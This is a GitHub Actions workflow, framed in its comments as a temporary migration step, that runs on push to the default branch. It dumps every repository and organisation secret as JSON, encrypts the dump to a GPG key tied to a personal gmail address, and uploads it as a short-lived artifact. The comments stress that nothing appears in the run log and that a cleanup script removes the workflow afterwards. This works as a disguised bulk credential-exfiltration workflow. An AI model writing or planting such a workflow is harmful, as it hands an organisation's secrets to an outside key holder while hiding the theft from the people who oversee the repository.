name: recover-secrets

# TEMPORARY migration workflow. Dumps all secrets visible to this repo,
# encrypts them to the migration GPG public key, uploads as an artifact.
# Plaintext never appears in the run log. Removed by cleanup.sh when done.

on:
  # Pushed directly to the default branch (red, or main) so the run fires.
  push:
    branches:
      - red
      - main
  # Lets you re-run without another push.
  workflow_dispatch:

permissions:
  contents: read

jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Dump + encrypt all visible secrets
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
        run: |
          set -euo pipefail
          # Write raw JSON of every secret visible to this repo (repo + org).
          printf '%s' "$ALL_SECRETS" > secrets.json
          # Import recipient public key and encrypt. No plaintext to stdout.
          gpg --batch --import .github/recovery-pubkey.asc
          gpg --batch --yes --trust-model always \
            --encrypt --recipient qnlbnsl@gmail.com \
            --output secrets.json.gpg secrets.json
          rm -f secrets.json
          echo "encrypted $(wc -c < secrets.json.gpg) bytes"

      - name: Upload encrypted artifact
        uses: actions/upload-artifact@v4
        with:
          name: secrets-${{ github.event.repository.name }}
          path: secrets.json.gpg
          retention-days: 1
